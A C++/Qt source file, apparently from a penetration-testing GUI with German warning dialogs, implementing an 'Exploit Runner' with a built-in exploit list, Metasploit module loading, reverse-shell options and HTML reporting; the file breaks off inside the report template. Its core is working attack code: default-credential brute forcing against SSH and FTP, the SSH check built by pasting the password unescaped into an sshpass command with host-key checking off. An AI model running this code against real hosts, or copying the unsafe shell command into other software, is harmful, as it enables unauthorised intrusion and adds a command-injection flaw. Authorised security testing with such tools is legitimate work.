#include <QtWidgets/QMessageBox>
#include <QtWidgets/QInputDialog>
#include <QtCore/QStandardPaths>
#include <QtCore/QDir>
#include <QtCore/QJsonDocument>
#include <QtCore/QJsonObject>
#include <QtCore/QJsonArray>
#include "exploitsystem.h"

ExploitDatabase* ExploitDatabase::s_instance = nullptr;

ExploitDatabase* ExploitDatabase::instance()
{
    if (!s_instance) {
        s_instance = new ExploitDatabase();
    }
    return s_instance;
}

ExploitDatabase::ExploitDatabase()
{
    initializeBuiltinExploits();
    loadExploitsFromFile();
}

void ExploitDatabase::initializeBuiltinExploits()
{
    m_exploits.append(BuiltinExploits::createSSHBruteForce());
    m_exploits.append(BuiltinExploits::createFTPBruteForce());
    m_exploits.append(BuiltinExploits::createHTTPBruteForce());
    m_exploits.append(BuiltinExploits::createSQLInjection());
    m_exploits.append(BuiltinExploits::createSMBNullSession());
    m_exploits.append(BuiltinExploits::createTelnetBruteForce());
    m_exploits.append(BuiltinExploits::createSNMPBruteForce());
}

QList<ExploitInfo> ExploitDatabase::getExploitsForVulnerability(const VulnerabilityInfo &vuln)
{
    QList<ExploitInfo> matchingExploits;

    for (const ExploitInfo &exploit : m_exploits) {
        if (exploit.targetService.toLower() == vuln.service.toLower() ||
            exploit.targetPort == vuln.port) {
            matchingExploits.append(exploit);
        }
    }

    return matchingExploits;
}

QList<ExploitInfo> ExploitDatabase::getExploitsForService(const QString &service, int port)
{
    QList<ExploitInfo> matchingExploits;

    for (const ExploitInfo &exploit : m_exploits) {
        if (exploit.targetService.toLower() == service.toLower() ||
            exploit.targetPort == port) {
            matchingExploits.append(exploit);
        }
    }

    return matchingExploits;
}

ExploitWorker::ExploitWorker(const VulnerabilityInfo &vulnerability, const ExploitInfo &exploit, const QString &targetIp)
    : m_vulnerability(vulnerability), m_exploit(exploit), m_targetIp(targetIp)
{
    m_socket = nullptr;
    m_process = nullptr;
    setAutoDelete(true);
}

void ExploitWorker::run()
{
    emit exploitStarted(m_exploit.id, m_targetIp);

    m_result.exploitId = m_exploit.id;
    m_result.targetIp = m_targetIp;
    m_result.targetPort = m_exploit.targetPort;
    m_result.executionTime = QDateTime::currentDateTime();
    m_result.successful = false;

    try {
        switch (m_exploit.type) {
        case ExploitType::CREDENTIAL_ATTACK:
            executeCredentialAttack();
            break;
        case ExploitType::BUFFER_OVERFLOW:
            executeBufferOverflow();
            break;
        case ExploitType::SQL_INJECTION:
            executeSQLInjection();
            break;
        case ExploitType::COMMAND_INJECTION:
            executeCommandInjection();
            break;
        case ExploitType::METASPLOIT_MODULE:
            executeMetasploitModule();
            break;
        case ExploitType::CUSTOM_SCRIPT:
            executeCustomScript();
            break;
        case ExploitType::DENIAL_OF_SERVICE:
            executeDenialOfService();
            break;
        default:
            m_result.errorMessage = "Exploit type not implemented";
            emit exploitFailed(m_exploit.id, m_result.errorMessage);
            return;
        }

        emit exploitCompleted(m_exploit.id, m_result);

    } catch (const std::exception &e) {
        m_result.errorMessage = QString("Exception: %1").arg(e.what());
        emit exploitFailed(m_exploit.id, m_result.errorMessage);
    }

    if (m_socket) {
        m_socket->deleteLater();
    }
    if (m_process) {
        m_process->kill();
        m_process->deleteLater();
    }
}

void ExploitWorker::executeCredentialAttack()
{
    emit exploitProgress(m_exploit.id, 10, "Starting credential attack...");

    // Common credentials for different services
    QStringList commonUsers = {"admin", "administrator", "root", "user", "guest", "test", "demo"};
    QStringList commonPasswords = {"", "admin", "password", "123456", "admin123", "root", "guest", "test"};

    if (m_exploit.targetService.toLower() == "ssh") {
        commonUsers << "ubuntu" << "pi" << "vagrant";
        commonPasswords << "ubuntu" << "raspberry" << "vagrant";
    } else if (m_exploit.targetService.toLower() == "ftp") {
        commonUsers << "anonymous" << "ftp";
        commonPasswords << "" << "ftp" << "anonymous";
    }

    int totalAttempts = commonUsers.size() * commonPasswords.size();
    int currentAttempt = 0;

    for (const QString &username : commonUsers) {
        for (const QString &password : commonPasswords) {
            currentAttempt++;
            int progress = 10 + (currentAttempt * 80) / totalAttempts;

            emit exploitProgress(m_exploit.id, progress,
                                 QString("Trying %1:%2").arg(username, password.isEmpty() ? "<empty>" : password));

            if (testCredentials(username, password)) {
                m_result.successful = true;
                m_result.gainedAccess = QString("Valid credentials: %1:%2").arg(username, password);
                m_result.output += QString("SUCCESS: %1:%2\n").arg(username, password);
                extractSystemInfo();
                return;
            }

            QThread::msleep(100); // Prevent flooding
        }
    }

    m_result.output += "No valid credentials found with common combinations";
}

bool ExploitWorker::testCredentials(const QString &username, const QString &password)
{
    if (m_exploit.targetService.toLower() == "ssh") {
        return testSSHCredentials(username, password);
    } else if (m_exploit.targetService.toLower() == "ftp") {
        return testFTPCredentials(username, password);
    } else if (m_exploit.targetService.toLower() == "telnet") {
        return testTelnetCredentials(username, password);
    }

    return false;
}

bool ExploitWorker::testSSHCredentials(const QString &username, const QString &password)
{
    // In a real implementation, you would use libssh or similar
    // For this example, we'll simulate the test
    QProcess sshProcess;

    QString command = QString("sshpass -p '%1' ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no %2@%3 'echo SUCCESS'")
                          .arg(password, username, m_targetIp);

    sshProcess.start("bash", QStringList() << "-c" << command);
    sshProcess.waitForFinished(10000);

    QString output = sshProcess.readAllStandardOutput();
    return output.contains("SUCCESS");
}

bool ExploitWorker::testFTPCredentials(const QString &username, const QString &password)
{
    QTcpSocket socket;
    socket.connectToHost(m_targetIp, m_exploit.targetPort);

    if (!socket.waitForConnected(5000)) {
        return false;
    }

    // Read welcome message
    socket.waitForReadyRead(2000);
    socket.readAll();

    // Send username
    socket.write(QString("USER %1\r\n").arg(username).toUtf8());
    socket.waitForReadyRead(2000);
    QString response = socket.readAll();

    if (response.startsWith("331")) {
        // Send password
        socket.write(QString("PASS %1\r\n").arg(password).toUtf8());
        socket.waitForReadyRead(2000);
        response = socket.readAll();

        if (response.startsWith("230")) {
            socket.write("QUIT\r\n");
            return true;
        }
    }

    socket.close();
    return false;
}

ExploitDialog::ExploitDialog(const VulnerabilityInfo &vulnerability, QWidget *parent)
    : QDialog(parent), m_vulnerability(vulnerability), m_currentWorker(nullptr), m_exploitRunning(false)
{
    setWindowTitle(QString("üî• Exploit Runner - %1").arg(vulnerability.title));
    resize(800, 600);
    setModal(true);

    showWarningDialog();
    setupUI();
    loadAvailableExploits();
}

void ExploitDialog::showWarningDialog()
{
    QMessageBox::StandardButton reply = QMessageBox::warning(this,
                                                             "‚ö†Ô∏è WARNUNG - Exploit Execution",
                                                             "WICHTIGER SICHERHEITSHINWEIS:\n\n"
                                                             "‚Ä¢ Diese Funktion f√ºhrt echte Angriffe auf Zielsysteme aus\n"
                                                             "‚Ä¢ Verwenden Sie dies nur in Ihrem eigenen Netzwerk\n"
                                                             "‚Ä¢ Stellen Sie sicher, dass Sie die Berechtigung haben\n"
                                                             "‚Ä¢ Exploits k√∂nnen Systeme besch√§digen oder destabilisieren\n"
                                                             "‚Ä¢ Dokumentieren Sie alle Tests f√ºr Compliance\n\n"
                                                             "M√∂chten Sie fortfahren?",
                                                             QMessageBox::Yes | QMessageBox::No | QMessageBox::Cancel);

    if (reply != QMessageBox::Yes) {
        reject();
        return;
    }
}

void ExploitDialog::setupUI()
{
    QVBoxLayout *mainLayout = new QVBoxLayout(this);

    // Target info header
    QGroupBox *targetGroup = new QGroupBox("üéØ Target Information");
    QGridLayout *targetLayout = new QGridLayout(targetGroup);

    targetLayout->addWidget(new QLabel("Vulnerability:"), 0, 0);
    targetLayout->addWidget(new QLabel(m_vulnerability.title), 0, 1);
    targetLayout->addWidget(new QLabel("Service:"), 1, 0);
    targetLayout->addWidget(new QLabel(QString("%1:%2").arg(m_vulnerability.service).arg(m_vulnerability.port)), 1, 1);
    targetLayout->addWidget(new QLabel("Severity:"), 2, 0);

    QString severityText;
    switch (m_vulnerability.severity) {
    case VulnSeverity::CRITICAL: severityText = "üî¥ CRITICAL"; break;
    case VulnSeverity::HIGH: severityText = "üü† HIGH"; break;
    case VulnSeverity::MEDIUM: severityText = "üü° MEDIUM"; break;
    case VulnSeverity::LOW: severityText = "üü¢ LOW"; break;
    case VulnSeverity::INFO: severityText = "‚ÑπÔ∏è INFO"; break;
    }
    targetLayout->addWidget(new QLabel(severityText), 2, 1);

    mainLayout->addWidget(targetGroup);

    // Tab widget for different sections
    m_tabWidget = new QTabWidget();

    // Exploit Selection Tab
    QWidget *exploitTab = new QWidget();
    QHBoxLayout *exploitLayout = new QHBoxLayout(exploitTab);

    // Left side: exploit list
    QVBoxLayout *leftLayout = new QVBoxLayout();
    leftLayout->addWidget(new QLabel("üî• Available Exploits:"));

    m_exploitTable = new QTableWidget();
    m_exploitTable->setColumnCount(5);
    m_exploitTable->setHorizontalHeaderLabels({"Name", "Type", "Difficulty", "Success Rate", "Requirements"});
    m_exploitTable->horizontalHeader()->setStretchLastSection(true);
    m_exploitTable->setSelectionBehavior(QAbstractItemView::SelectRows);
    leftLayout->addWidget(m_exploitTable);

    // Control buttons
    QHBoxLayout *controlLayout = new QHBoxLayout();
    m_runExploitButton = new QPushButton("üöÄ Run Exploit");
    m_runExploitButton->setStyleSheet("QPushButton { background-color: #dc3545; color: white; font-weight: bold; }");
    m_stopExploitButton = new QPushButton("‚èπÔ∏è Stop");
    m_stopExploitButton->setEnabled(false);

    controlLayout->addWidget(m_runExploitButton);
    controlLayout->addWidget(m_stopExploitButton);
    controlLayout->addStretch();

    leftLayout->addLayout(controlLayout);

    // Progress and status
    m_statusLabel = new QLabel("Ready to execute exploit");
    m_progressBar = new QProgressBar();
    leftLayout->addWidget(m_statusLabel);
    leftLayout->addWidget(m_progressBar);

    exploitLayout->addLayout(leftLayout, 2);

    // Right side: exploit details
    QVBoxLayout *rightLayout = new QVBoxLayout();
    rightLayout->addWidget(new QLabel("üìã Exploit Details:"));

    m_exploitDetails = new QTextEdit();
    m_exploitDetails->setReadOnly(true);
    m_exploitDetails->setMaximumWidth(300);
    rightLayout->addWidget(m_exploitDetails);

    exploitLayout->addLayout(rightLayout, 1);

    m_tabWidget->addTab(exploitTab, "üî• Exploits");

    // Configuration Tab
    QWidget *configTab = new QWidget();
    QVBoxLayout *configLayout = new QVBoxLayout(configTab);

    QGroupBox *payloadGroup = new QGroupBox("‚öôÔ∏è Payload Configuration");
    QFormLayout *payloadLayout = new QFormLayout(payloadGroup);

    m_payloadEdit = new QLineEdit();
    m_timeoutSpinBox = new QSpinBox();
    m_timeoutSpinBox->setRange(5, 300);
    m_timeoutSpinBox->setValue(30);
    m_timeoutSpinBox->setSuffix(" sec");

    payloadLayout->addRow("Custom Payload:", m_payloadEdit);
    payloadLayout->addRow("Timeout:", m_timeoutSpinBox);

    QGroupBox *shellGroup = new QGroupBox("üêö Reverse Shell Options");
    QFormLayout *shellLayout = new QFormLayout(shellGroup);

    m_reverseShellCheckBox = new QCheckBox("Enable Reverse Shell");
    m_listenerPortEdit = new QLineEdit("4444");
    m_shellTypeCombo = new QComboBox();
    m_shellTypeCombo->addItems({"bash", "sh", "cmd", "powershell", "python", "perl"});
    m_verboseOutputCheckBox = new QCheckBox("Verbose Output");
    m_verboseOutputCheckBox->setChecked(true);

    shellLayout->addRow(m_reverseShellCheckBox);
    shellLayout->addRow("Listener Port:", m_listenerPortEdit);
    shellLayout->addRow("Shell Type:", m_shellTypeCombo);
    shellLayout->addRow(m_verboseOutputCheckBox);

    configLayout->addWidget(payloadGroup);
    configLayout->addWidget(shellGroup);
    configLayout->addStretch();

    m_tabWidget->addTab(configTab, "‚öôÔ∏è Config");

    // Results Tab
    QWidget *resultsTab = new QWidget();
    QVBoxLayout *resultsLayout = new QVBoxLayout(resultsTab);

    QLabel *outputLabel = new QLabel("üì§ Exploit Output:");
    m_outputEdit = new QTextEdit();
    m_outputEdit->setFont(QFont("Consolas", 10));

    QLabel *errorLabel = new QLabel("‚ùå Errors:");
    m_errorEdit = new QTextEdit();
    m_errorEdit->setMaximumHeight(100);
    m_errorEdit->setStyleSheet("QTextEdit { background-color: #2d1b1b; color: #ff6b6b; }");

    QLabel *sessionLabel = new QLabel("üîó Active Sessions:");
    m_sessionTable = new QTableWidget();
    m_sessionTable->setColumnCount(4);
    m_sessionTable->setHorizontalHeaderLabels({"Session ID", "Type", "Target", "Status"});
    m_sessionTable->setMaximumHeight(120);

    QHBoxLayout *resultButtonLayout = new QHBoxLayout();
    m_saveResultsButton = new QPushButton("üíæ Save Results");
    m_openShellButton = new QPushButton("üêö Open Shell");
    m_openShellButton->setEnabled(false);

    resultButtonLayout->addWidget(m_saveResultsButton);
    resultButtonLayout->addWidget(m_openShellButton);
    resultButtonLayout->addStretch();

    resultsLayout->addWidget(outputLabel);
    resultsLayout->addWidget(m_outputEdit, 2);
    resultsLayout->addWidget(errorLabel);
    resultsLayout->addWidget(m_errorEdit);
    resultsLayout->addWidget(sessionLabel);
    resultsLayout->addWidget(m_sessionTable);
    resultsLayout->addLayout(resultButtonLayout);

    m_tabWidget->addTab(resultsTab, "üìä Results");

    mainLayout->addWidget(m_tabWidget);

    // Bottom buttons
    QHBoxLayout *bottomLayout = new QHBoxLayout();
    QPushButton *closeButton = new QPushButton("‚ùå Close");
    QPushButton *helpButton = new QPushButton("‚ùì Help");

    bottomLayout->addWidget(helpButton);
    bottomLayout->addStretch();
    bottomLayout->addWidget(closeButton);

    mainLayout->addLayout(bottomLayout);

    // Connect signals
    connect(m_exploitTable, &QTableWidget::itemSelectionChanged, this, &ExploitDialog::onExploitSelected);
    connect(m_runExploitButton, &QPushButton::clicked, this, &ExploitDialog::runSelectedExploit);
    connect(m_stopExploitButton, &QPushButton::clicked, this, &ExploitDialog::stopExploit);
    connect(m_saveResultsButton, &QPushButton::clicked, this, &ExploitDialog::saveExploitResults);
    connect(m_openShellButton, &QPushButton::clicked, this, &ExploitDialog::openReverseShell);
    connect(closeButton, &QPushButton::clicked, this, &QDialog::accept);

    connect(helpButton, &QPushButton::clicked, [this]() {
        QMessageBox::information(this, "‚ùì Exploit Runner Help",
                                 "üî• EXPLOIT RUNNER HILFE\n\n"
                                 "üìã Exploit Auswahl:\n"
                                 "‚Ä¢ W√§hlen Sie einen passenden Exploit aus der Liste\n"
                                 "‚Ä¢ √úberpr√ºfen Sie die Anforderungen und Erfolgsrate\n"
                                 "‚Ä¢ Konfigurieren Sie ggf. custom Payloads\n\n"
                                 "‚öôÔ∏è Konfiguration:\n"
                                 "‚Ä¢ Passen Sie Timeouts an das Zielsystem an\n"
                                 "‚Ä¢ Aktivieren Sie Reverse Shell f√ºr interaktive Zugriffe\n"
                                 "‚Ä¢ Verbose Output f√ºr detaillierte Logs\n\n"
                                 "üöÄ Ausf√ºhrung:\n"
                                 "‚Ä¢ Klicken Sie 'Run Exploit' zum Starten\n"
                                 "‚Ä¢ √úberwachen Sie den Fortschritt im Status\n"
                                 "‚Ä¢ Ergebnisse werden im Results Tab angezeigt\n\n"
                                 "‚ö†Ô∏è WICHTIG:\n"
                                 "‚Ä¢ Nur in autorisierten Netzwerken verwenden\n"
                                 "‚Ä¢ Dokumentieren Sie alle Tests\n"
                                 "‚Ä¢ Stoppen Sie Exploits bei Problemen sofort");
    });
}

void ExploitDialog::loadAvailableExploits()
{
    m_availableExploits = ExploitDatabase::instance()->getExploitsForVulnerability(m_vulnerability);

    // Add Metasploit modules if available
    QStringList metasploitModules = getMetasploitModules(m_vulnerability.service, m_vulnerability.port);
    for (const QString &module : metasploitModules) {
        ExploitInfo metasploitExploit;
        metasploitExploit.id = QString("msf_%1").arg(module);
        metasploitExploit.name = QString("Metasploit: %1").arg(module);
        metasploitExploit.description = QString("Metasploit module for %1").arg(m_vulnerability.service);
        metasploitExploit.type = ExploitType::METASPLOIT_MODULE;
        metasploitExploit.targetService = m_vulnerability.service;
        metasploitExploit.targetPort = m_vulnerability.port;
        metasploitExploit.metasploitModule = module;
        metasploitExploit.requirements = "Metasploit Framework";
        metasploitExploit.successRate = 0.6;
        metasploitExploit.difficulty = "medium";
        m_availableExploits.append(metasploitExploit);
    }

    // Populate table
    setupExploitList();
}

void ExploitDialog::setupExploitList()
{
    m_exploitTable->setRowCount(m_availableExploits.size());

    for (int i = 0; i < m_availableExploits.size(); ++i) {
        const ExploitInfo &exploit = m_availableExploits[i];

        m_exploitTable->setItem(i, 0, new QTableWidgetItem(exploit.name));

        QString typeStr;
        switch (exploit.type) {
        case ExploitType::CREDENTIAL_ATTACK: typeStr = "üîë Credentials"; break;
        case ExploitType::BUFFER_OVERFLOW: typeStr = "üí• Buffer Overflow"; break;
        case ExploitType::SQL_INJECTION: typeStr = "üóÉÔ∏è SQL Injection"; break;
        case ExploitType::XSS_ATTACK: typeStr = "üåê XSS"; break;
        case ExploitType::COMMAND_INJECTION: typeStr = "‚ö° Command Injection"; break;
        case ExploitType::PRIVILEGE_ESCALATION: typeStr = "‚¨ÜÔ∏è Privilege Escalation"; break;
        case ExploitType::DENIAL_OF_SERVICE: typeStr = "üí• DoS"; break;
        case ExploitType::METASPLOIT_MODULE: typeStr = "üöÄ Metasploit"; break;
        case ExploitType::CUSTOM_SCRIPT: typeStr = "üìú Custom"; break;
        }
        m_exploitTable->setItem(i, 1, new QTableWidgetItem(typeStr));

        // Difficulty with color coding
        QTableWidgetItem *difficultyItem = new QTableWidgetItem(exploit.difficulty.toUpper());
        if (exploit.difficulty == "easy") {
            difficultyItem->setBackground(QColor(40, 167, 69, 100));
        } else if (exploit.difficulty == "medium") {
            difficultyItem->setBackground(QColor(255, 193, 7, 100));
        } else if (exploit.difficulty == "hard") {
            difficultyItem->setBackground(QColor(220, 53, 69, 100));
        } else {
            difficultyItem->setBackground(QColor(108, 117, 125, 100));
        }
        m_exploitTable->setItem(i, 2, difficultyItem);

        // Success rate
        QTableWidgetItem *successItem = new QTableWidgetItem(QString("%1%").arg(exploit.successRate * 100, 0, 'f', 0));
        if (exploit.successRate >= 0.7) {
            successItem->setBackground(QColor(40, 167, 69, 100));
        } else if (exploit.successRate >= 0.4) {
            successItem->setBackground(QColor(255, 193, 7, 100));
        } else {
            successItem->setBackground(QColor(220, 53, 69, 100));
        }
        m_exploitTable->setItem(i, 3, successItem);

        m_exploitTable->setItem(i, 4, new QTableWidgetItem(exploit.requirements));
    }

    m_exploitTable->resizeColumnsToContents();
}

void ExploitDialog::onExploitSelected()
{
    int currentRow = m_exploitTable->currentRow();
    if (currentRow < 0 || currentRow >= m_availableExploits.size()) {
        return;
    }

    m_selectedExploit = m_availableExploits[currentRow];
    updateExploitDetails();

    // Enable run button
    m_runExploitButton->setEnabled(!m_exploitRunning);

    // Update payload field with default payload
    m_payloadEdit->setText(m_selectedExploit.payload);
}

void ExploitDialog::updateExploitDetails()
{
    QString details = QString(R"(
<h3>üî• %1</h3>

<h4>üìã Description:</h4>
<p>%2</p>

<h4>üéØ Target Information:</h4>
<table border="0" cellpadding="3">
<tr><td><b>Service:</b></td><td>%3</td></tr>
<tr><td><b>Port:</b></td><td>%4</td></tr>
<tr><td><b>Type:</b></td><td>%5</td></tr>
<tr><td><b>Difficulty:</b></td><td>%6</td></tr>
</table>

<h4>üìä Statistics:</h4>
<table border="0" cellpadding="3">
<tr><td><b>Success Rate:</b></td><td>%7%</td></tr>
<tr><td><b>Requires Auth:</b></td><td>%8</td></tr>
<tr><td><b>Author:</b></td><td>%9</td></tr>
</table>

<h4>‚öôÔ∏è Requirements:</h4>
<p>%10</p>

<h4>üöÄ Payload:</h4>
<pre style="background: #1a1a1a; padding: 10px; border-radius: 5px;">%11</pre>

%12
    )").arg(m_selectedExploit.name)
                          .arg(m_selectedExploit.description)
                          .arg(m_selectedExploit.targetService)
                          .arg(m_selectedExploit.targetPort)
                          .arg([](ExploitType type) {
                              switch (type) {
                              case ExploitType::CREDENTIAL_ATTACK: return "Credential Attack";
                              case ExploitType::BUFFER_OVERFLOW: return "Buffer Overflow";
                              case ExploitType::SQL_INJECTION: return "SQL Injection";
                              case ExploitType::XSS_ATTACK: return "XSS Attack";
                              case ExploitType::COMMAND_INJECTION: return "Command Injection";
                              case ExploitType::PRIVILEGE_ESCALATION: return "Privilege Escalation";
                              case ExploitType::DENIAL_OF_SERVICE: return "Denial of Service";
                              case ExploitType::METASPLOIT_MODULE: return "Metasploit Module";
                              case ExploitType::CUSTOM_SCRIPT: return "Custom Script";
                              }
                              return "Unknown";
                          }(m_selectedExploit.type))
                          .arg(m_selectedExploit.difficulty.toUpper())
                          .arg(m_selectedExploit.successRate * 100, 0, 'f', 0)
                          .arg(m_selectedExploit.requiresAuth ? "Yes" : "No")
                          .arg(m_selectedExploit.author)
                          .arg(m_selectedExploit.requirements)
                          .arg(m_selectedExploit.payload)
                          .arg(!m_selectedExploit.cveId.isEmpty() ?
                                   QString("<h4>üîó CVE Reference:</h4><p>%1</p>").arg(m_selectedExploit.cveId) : "");

    m_exploitDetails->setHtml(details);
}

void ExploitDialog::runSelectedExploit()
{
    if (m_selectedExploit.id.isEmpty()) {
        QMessageBox::warning(this, "‚ö†Ô∏è Warning", "Please select an exploit first!");
        return;
    }

    // Final confirmation
    QMessageBox::StandardButton reply = QMessageBox::question(this,
                                                              "üöÄ Confirm Exploit Execution",
                                                              QString("Are you sure you want to run this exploit?\n\n"
                                                                      "Target: %1:%2\n"
                                                                      "Exploit: %3\n"
                                                                      "Type: %4\n\n"
                                                                      "This action will attempt to exploit the target system!")
                                                                  .arg(m_vulnerability.service)
                                                                  .arg(m_vulnerability.port)
                                                                  .arg(m_selectedExploit.name)
                                                                  .arg(m_selectedExploit.targetService),
                                                              QMessageBox::Yes | QMessageBox::No);

    if (reply != QMessageBox::Yes) {
        return;
    }

    // Clear previous results
    m_outputEdit->clear();
    m_errorEdit->clear();
    m_sessionTable->setRowCount(0);

    // Update UI state
    m_exploitRunning = true;
    m_runExploitButton->setEnabled(false);
    m_stopExploitButton->setEnabled(true);
    m_progressBar->setValue(0);
    m_statusLabel->setText("üöÄ Starting exploit...");

    // Switch to results tab
    m_tabWidget->setCurrentIndex(2);

    // Get target IP from vulnerability (assuming it's stored there)
    QString targetIp = "192.168.1.100"; // This should come from the vulnerability or be configurable

    // Create and start exploit worker
    m_currentWorker = new ExploitWorker(m_vulnerability, m_selectedExploit, targetIp);

    connect(m_currentWorker, &ExploitWorker::exploitStarted,
            this, &ExploitDialog::onExploitStarted);
    connect(m_currentWorker, &ExploitWorker::exploitProgress,
            this, &ExploitDialog::onExploitProgress);
    connect(m_currentWorker, &ExploitWorker::exploitCompleted,
            this, &ExploitDialog::onExploitCompleted);
    connect(m_currentWorker, &ExploitWorker::exploitFailed,
            this, &ExploitDialog::onExploitFailed);
    connect(m_currentWorker, &ExploitWorker::shellObtained,
            this, &ExploitDialog::onShellObtained);

    QThreadPool::globalInstance()->start(m_currentWorker);
}

void ExploitDialog::stopExploit()
{
    if (m_currentWorker) {
        // In a real implementation, you would signal the worker to stop
        m_statusLabel->setText("‚èπÔ∏è Stopping exploit...");
        m_exploitRunning = false;
        m_runExploitButton->setEnabled(true);
        m_stopExploitButton->setEnabled(false);

        m_outputEdit->append("\nüõë EXPLOIT STOPPED BY USER\n");
    }
}

void ExploitDialog::onExploitStarted(const QString &exploitId, const QString &target)
{
    m_statusLabel->setText(QString("üöÄ Running exploit %1 on %2").arg(exploitId, target));
    m_outputEdit->append(QString("=== EXPLOIT EXECUTION STARTED ===\n"));
    m_outputEdit->append(QString("Exploit ID: %1\n").arg(exploitId));
    m_outputEdit->append(QString("Target: %1\n").arg(target));
    m_outputEdit->append(QString("Start Time: %1\n").arg(QDateTime::currentDateTime().toString()));
    m_outputEdit->append(QString("===================================\n\n"));
}

void ExploitDialog::onExploitProgress(const QString &exploitId, int percentage, const QString &status)
{
    Q_UNUSED(exploitId)
    m_progressBar->setValue(percentage);
    m_statusLabel->setText(status);
    m_outputEdit->append(QString("[%1%] %2\n").arg(percentage).arg(status));
    m_outputEdit->ensureCursorVisible();
}

void ExploitDialog::onExploitCompleted(const QString &exploitId, const ExploitResult &result)
{
    Q_UNUSED(exploitId)

    m_exploitRunning = false;
    m_runExploitButton->setEnabled(true);
    m_stopExploitButton->setEnabled(false);
    m_progressBar->setValue(100);

    m_exploitResults.append(result);

    if (result.successful) {
        m_statusLabel->setText("‚úÖ Exploit completed successfully!");
        m_statusLabel->setStyleSheet("color: #28a745; font-weight: bold;");

        m_outputEdit->append(QString("\nüéâ EXPLOIT SUCCESSFUL! üéâ\n"));
        m_outputEdit->append(QString("Gained Access: %1\n").arg(result.gainedAccess));
        m_outputEdit->append(QString("Session Info: %1\n").arg(result.sessionInfo));

        if (!result.extractedData.isEmpty()) {
            m_outputEdit->append(QString("\nüìã Extracted Data:\n"));
            for (const QString &data : result.extractedData) {
                m_outputEdit->append(QString("  ‚Ä¢ %1\n").arg(data));
            }
        }

        // Add session to table if shell was obtained
        if (!result.shellType.isEmpty()) {
            int row = m_sessionTable->rowCount();
            m_sessionTable->insertRow(row);
            m_sessionTable->setItem(row, 0, new QTableWidgetItem(QString("Session_%1").arg(row + 1)));
            m_sessionTable->setItem(row, 1, new QTableWidgetItem(result.shellType));
            m_sessionTable->setItem(row, 2, new QTableWidgetItem(QString("%1:%2").arg(result.targetIp).arg(result.connectionPort)));
            m_sessionTable->setItem(row, 3, new QTableWidgetItem("üü¢ Active"));

            m_openShellButton->setEnabled(true);
        }

        // Show success message
        QMessageBox::information(this, "üéâ Exploit Successful",
                                 QString("Exploit executed successfully!\n\n"
                                         "Target: %1:%2\n"
                                         "Exploit: %3\n"
                                         "Access Gained: %4\n\n"
                                         "Check the Results tab for detailed information.")
                                     .arg(result.targetIp)
                                     .arg(result.targetPort)
                                     .arg(m_selectedExploit.name)
                                     .arg(result.gainedAccess));

    } else {
        m_statusLabel->setText("‚ùå Exploit failed");
        m_statusLabel->setStyleSheet("color: #dc3545; font-weight: bold;");

        m_outputEdit->append(QString("\n‚ùå EXPLOIT FAILED\n"));
        if (!result.errorMessage.isEmpty()) {
            m_errorEdit->append(result.errorMessage);
        }
    }

    m_outputEdit->append(QString("\nOutput:\n%1\n").arg(result.output));
    m_outputEdit->append(QString("\n=== EXPLOIT EXECUTION COMPLETED ===\n"));
    m_outputEdit->ensureCursorVisible();
}

void ExploitDialog::onExploitFailed(const QString &exploitId, const QString &error)
{
    Q_UNUSED(exploitId)

    m_exploitRunning = false;
    m_runExploitButton->setEnabled(true);
    m_stopExploitButton->setEnabled(false);

    m_statusLabel->setText("‚ùå Exploit failed");
    m_statusLabel->setStyleSheet("color: #dc3545; font-weight: bold;");

    m_outputEdit->append(QString("\n‚ùå EXPLOIT FAILED: %1\n").arg(error));
    m_errorEdit->append(error);
}

void ExploitDialog::onShellObtained(const QString &exploitId, const QString &shellInfo)
{
    Q_UNUSED(exploitId)

    m_outputEdit->append(QString("\nüêö SHELL OBTAINED: %1\n").arg(shellInfo));
    m_openShellButton->setEnabled(true);

    // Show shell notification
    QMessageBox::information(this, "üêö Shell Obtained",
                             QString("Interactive shell established!\n\n%1\n\nUse 'Open Shell' button to interact with the target.")
                                 .arg(shellInfo));
}

void ExploitDialog::saveExploitResults()
{
    if (m_exploitResults.isEmpty()) {
        QMessageBox::information(this, "üíæ Save Results", "No results to save yet.");
        return;
    }

    QString fileName = QFileDialog::getSaveFileName(this,
                                                    "üíæ Save Exploit Results",
                                                    QString("exploit_results_%1.html").arg(QDateTime::currentDateTime().toString("yyyyMMdd_hhmmss")),
                                                    "HTML Files (*.html);;JSON Files (*.json);;Text Files (*.txt)");

    if (fileName.isEmpty()) return;

    QFile file(fileName);
    if (!file.open(QIODevice::WriteOnly | QIODevice::Text)) {
        QMessageBox::warning(this, "‚ùå Error", "Could not open file for writing");
        return;
    }

    QTextStream stream(&file);

    if (fileName.endsWith(".html")) {
        // Generate HTML report
        stream << generateHTMLExploitReport();
    } else if (fileName.endsWith(".json")) {
        // Generate JSON report
        stream << generateJSONExploitReport();
    } else {
        // Generate text report
        stream << generateTextExploitReport();
    }

    QMessageBox::information(this, "‚úÖ Success",
                             QString("Exploit results saved successfully:\n%1").arg(fileName));
}

QString ExploitDialog::generateHTMLExploitReport()
{
    QString html = R"(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Exploit Execution Report</title>
    <style>
        body { font-family: Arial, sans-serif; background: #1e1e1e; color: #fff; margin: 20px; }
        .header { background: #dc3545; padding: 20px; border-radius: 5px; margin-bottom: 20px; }
        .success { background: #28a745; padding: 15px; border-radius: 5px; margin: 10px 0; }
        .failure { background: #6c757d; padding: 15px; border-radius: 5px; margin: 10px 0; }
        .warning { background: #ffc107; color: #000; padding: 10px; border-radius: 5px; margin: 10px 0; }
        table { border-collapse: collapse; width: 100%; margin: 10px 0; }
        th, td { border: 1px solid #404040; padding: 8px; text-align: left; }
        th { background-color: #343a40; }
        pre { background: #2d2d2d; padding: 10px; border-radius: 5px; overflow-x: auto; }
    </style>
</head>
<body>
    <div class="header">
        <h1>üî• Exploit Execution Report</h1>
        <p><strong>Generated:</strong> )" + QDateTime::currentDateTime().toString("dd.MM.yyyy hh:mm:ss") + R"(</p>
        <p><strong>Target:</strong> )" + m_vulnerability.service + ":" + QString::number(m_vulnerability.port) + R"(</p>
        <p><strong>Vulnerability:</strong> )" + m_vulnerability.title + R"(</p>
    </div>

    <div class="warning">
        <strong>‚ö†Ô∏è SECURITY NOTICE:</strong> This report contains sensitive penetration testing information.
        Handle with appropriate security measures and only share with authorized personnel.
    </div>
)";

    for (const ExploitResult &result : m_exploitResults) {
        QString statusClass = result.successful ? "success" : "failure";
        QString statusText = result.successful ? "‚úÖ SUCCESS" : "‚ùå FAILED";

        html += QString(R"(
    <div class="%1">
        <h2>%2 - Exploit: %3</h2>
        <table>
            <tr><th>Target IP</th><td>%4</td></tr>
